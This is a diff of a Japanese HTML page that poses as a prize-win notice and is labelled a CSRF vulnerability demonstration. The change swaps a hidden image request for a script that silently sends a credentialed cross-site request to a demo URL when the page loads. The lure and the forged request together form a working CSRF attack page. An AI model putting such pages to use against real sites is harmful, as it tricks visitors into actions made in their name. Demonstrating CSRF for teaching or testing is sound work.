@@ -1,17 +1,35 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <title>おめでとうございます！</title>
-    </head>
-    <body>
-        <h1>おめでとうございます！あなたは特別な景品に当選しました！</h1>
-        <p>景品を受け取るには、このページを開いたままお待ちください。</p>
+<head>
+  <meta charset="utf-8">
+  <title>おめでとうございます！</title>
+</head>
+<body>
+  <h1>おめでとうございます！あなたは特別な景品に当選しました！</h1>
+  <p>景品を受け取るには、このページを開いたままお待ちください。</p>
+  <p>景品は自動的に発送されます。しばらくお待ちください。</p>
+  <hr>
+  <p style="color: red;">
+    ※このコードはCSRF脆弱性のデモンストレーションを目的としています。<br>
+    悪用は厳禁です。
+  </p>
 
-        <img src="https://bh2025.vuln-demo.net/contact/463" style="display:none;">
-        <p>景品は自動的に発送されます。しばらくお待ちください。</p>
-        <hr>
-        <p style="color: red;">
-        ※このコードはCSRF脆弱性のデモンストレーションを目的としています。<br>
-        悪用は厳禁です。</p>
-    </body>
+  <script>
+  const user = 'username';
+  const pass = 'password';
+  const url  = 'https://bh2025.vuln-demo.net/contact/463';
+
+  const headers = new Headers();
+  headers.set('Authorization', 'Basic ' + btoa(user + ':' + pass));
+
+  fetch(url, { method: 'GET', headers: headers, credentials: 'include' })
+    .then(r => {
+      console.log('status', r.status);
+      return r.text();
+    })
+    .then(text => console.log(text))
+    .catch(err => console.error('fetch error', err));
+</script>
+
+</body>
 </html>
